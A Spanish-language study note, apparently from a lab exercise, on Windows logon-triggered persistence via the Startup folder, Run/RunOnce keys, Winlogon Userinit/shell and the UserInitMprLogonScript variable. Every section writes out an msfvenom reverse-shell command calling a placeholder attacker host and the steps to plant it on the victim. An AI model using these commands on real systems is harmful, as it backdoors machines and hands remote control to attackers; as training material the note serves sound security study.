---
layout: apunte
title: "6. Logon Triggered Persistence"
---

Algunas acciones realizadas por el usuario pueden también ayudar a ejecutar payloads específicos en pro de la persistencia. Los sistemas operativos Windows presentan varias formas de unir payloads a ciertas interacciones.

----------------------------------------------
<h2>Archivo Startup</h2>
Cada usuario tiene un archivo bajo `C:\Users\<nombre>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup` donde podemos poner ejecutables para ejecutar cuando el usuario inicia sesión.

Si queremos forzar a todos los usuarios a ejecutar un payload al iniciar sesión, podemos usar el directorio `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp` de la misma manera.

Para esta tarea, vamos a generar una reverse shell usando `msfvenom`:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP_ATACANTE LPORT=4450 -f exe -o revshell.exe
```

Copiamos el archivo a la máquina de la víctima.

Guardamos el payload en `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp`.

```batch
C:\> copy revshell.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\"
```

Ahora cerramos sesión:

!**Pasted image 20260705133934.png**

Y la volvemos a iniciar para obtener la shell.

-------------------------------------------------
<h2>Run/RunOnce</h2>
También puedes forzar a un usuario a ejecutar un programa al iniciar sesión vía registry. En lugar de entregar un payload a un directorio específico, puedes usar las siguientes entradas de registry para especificar aplicaciones que ejecutar al iniciar sesión:

- `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Micorsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`

Las entradas de registro bajo `HKCU` sólo aplicará al usuario actual, y aquellas bajo `HKLM` se aplicarán a todo el mundo. Cualquier programa especificado bajo la clave `Run` se ejecutará cada vez que el usuario inicie sesión. Los programas especificados bajo la clave `RunOnce` se ejecutarán una sola vez.

Para esta tarea, vamos a crear una nueva reverse shell:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4451 -f exe -o revshell.exe
```

Después de transferirlo a la víctima, lo movemos a `C:\Windows\ `:

```batch
C:\> move revshell.exe C:\Windows
```

Luego creamos el registry `REG_EXPAND_SZ` bajo `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`. El nombre de la entrada puede ser cualquier cosa que nos guste y el valor será el comando que queramos ejecutar.

!**Pasted image 20260705140751.png**

Después salimos e iniciamos la sesión de nuevo para recibir la shell.

-------------------------------------------
<h2>Winlogon</h2>
Otra alternativa es arrancar programas automáticamente al inicio de sesión abusando de Winlogon, el componente de Windows que carga tu perfil de usuario justo después de la autentificación.

Winlogon usa algunas claves de registro bajo `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\ ` que podrían ser interesantes para ganar persistencia:

- `Userinit` apunta a `userinit.exe`, el cual está a cargo de restaurar tus preferencias del perfil.
- `shell` apunta a la shell del sistema, que suele ser `explorer.exe`.

!**Pasted image 20260705143506.png**

Si reemplazamos cualquiera de los ejecutables con una reverse shell, podríamos romper la secuencia logon, lo que no queremos. Interesantemente, podemos añadir comandos separados por comas y Winlogon los procesará todos.

Comenzaremos creando una shell:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4452 -f exe -o revshell.exe
```

Transferiremos la shell a la máquina de nuestra víctima y la guardaremos en `C:\Windows`:

```batch
C:\> move revshell.exe C:\Windows
```

Luego alteramos o `shell` o `Userinit` en `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\ `. En este caso usaremos `Userinit`, pero el procedimiento con `shell` es el mismo.

!**Pasted image 20260705144421.png**

Después de añadir el comando que ejecuta la reverse shell, salimos e iniciamos sesión.

----------------------------------------
<h2>Scripts de Login</h2>
Una de las cosas que `userinit.exe` hace mientras carga tu perfil de usuario es comprobar una variable de entorno llamada `UserInitMprLogonScript`. Podemos usar esta variable de entorno para asignar un script de login a un usuario que se ejecutará al iniciar sesión en la máquina. La variable no está configurada por defecto, por lo que podemos crearla y asignar cualquier script que nos guste.

Ten en cuenta que cada usuario tiene sus propias variables de entorno, por lo que tendrás que backdorear cada uno independientemente.

Vamos a crear una reverse shell:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4453 -f exe -o revshell.exe
```

Transferiremos la shell a nuestra máquina víctima como hicimos antes. Podemos copiarla en `C:\Windows`, por ejemplo:

```batch
C:\> move revshell.exe C:\Windows
```

Para crear la variable de entorno para un usuario vamos a `HKCU\Environment` en el registry. Usaremos la entrada `UserInitMprLogonScript` para apuntar a nuestro payload, ya que cargará al iniciar sesión:

!**Pasted image 20260705144952.png**

